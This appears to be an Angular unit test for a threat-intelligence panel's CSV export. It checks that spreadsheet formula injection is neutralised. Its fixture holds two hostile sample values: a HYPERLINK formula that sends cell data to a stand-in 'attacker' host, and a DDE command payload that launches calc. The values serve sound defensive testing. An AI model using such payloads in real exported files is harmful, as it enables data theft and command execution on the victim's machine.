// ATTACK-Navi - Copyright (c) 2026 TeamStarWolf
// https://github.com/TeamStarWolf/ATTACK-Navi - MIT License
import { TestBed, ComponentFixture } from '@angular/core/testing';
import { BehaviorSubject } from 'rxjs';
import { ThreatIntelligencePanelComponent } from './threat-intelligence-panel.component';
import { FilterService } from '../../services/filter.service';
import { DataService } from '../../services/data.service';
import { MispService } from '../../services/misp.service';
import { OpenCtiService } from '../../services/opencti.service';

describe('ThreatIntelligencePanelComponent', () => {
  let component: ThreatIntelligencePanelComponent;
  let fixture: ComponentFixture<ThreatIntelligencePanelComponent>;

  beforeEach(() => {
    TestBed.configureTestingModule({
      imports: [ThreatIntelligencePanelComponent],
      providers: [
        { provide: FilterService, useValue: {
            activePanel$: new BehaviorSubject<string | null>(null),
            setActivePanel: jasmine.createSpy(),
        }},
        { provide: DataService, useValue: { domain$: new BehaviorSubject(null) }},
        { provide: MispService, useValue: { isConnected: () => false, connected$: new BehaviorSubject(false), total$: new BehaviorSubject(0), fetchEvents: () => ({ subscribe: () => {} }) } },
        { provide: OpenCtiService, useValue: { isConnected: () => false, connected$: new BehaviorSubject(false) } },
      ],
    });
    fixture = TestBed.createComponent(ThreatIntelligencePanelComponent);
    component = fixture.componentInstance;
    fixture.detectChanges();
  });

  it('is created', () => {
    expect(component).toBeTruthy();
  });

  describe('exportIndicatorCsv', () => {
    let lastBlob: Blob | null;

    beforeEach(() => {
      lastBlob = null;
      spyOn(URL, 'createObjectURL').and.callFake((blob: Blob) => {
        lastBlob = blob;
        return 'blob:stub';
      });
      spyOn(URL, 'revokeObjectURL').and.stub();
      spyOn(HTMLAnchorElement.prototype, 'click').and.stub();
    });

    it('neutralises formula-leading feed values and doubles embedded quotes', async () => {
      // Indicator content is adversary-controlled: a seeded MISP/OpenCTI
      // indicator can carry a spreadsheet formula or a quote that breaks the row.
      component.indicatorRows = [
        { source: 'MISP', type: 'comment "x"', value: '=HYPERLINK("http://attacker/"&A1,"click")', confidence: 50, lastUpdated: '2026-10-01' },
        { source: 'OpenCTI', type: 'domain', value: "=cmd|' /C calc'!A0", confidence: 80, lastUpdated: '-1' },
      ];
      component.exportIndicatorCsv();
      expect(lastBlob).not.toBeNull();
      const csv = await lastBlob!.text();
      const lines = csv.split('\n');
      expect(lines[0]).toBe('Source,Type,Value,Confidence,Last Updated');
      expect(lines[1]).toBe('"MISP","comment ""x""","\'=HYPERLINK(""http://attacker/""&A1,""click"")",50,"2026-10-01"');
      expect(lines[2]).toBe('"OpenCTI","domain","\'=cmd|\' /C calc\'!A0",80,"\'-1"');
      // No data cell may start with a formula trigger.
      for (const line of lines.slice(1)) {
        for (const cell of line.split(',')) {
          expect(cell.replace(/^"/, '')).not.toMatch(/^[=+\-@]/);
        }
      }
    });
  });
});
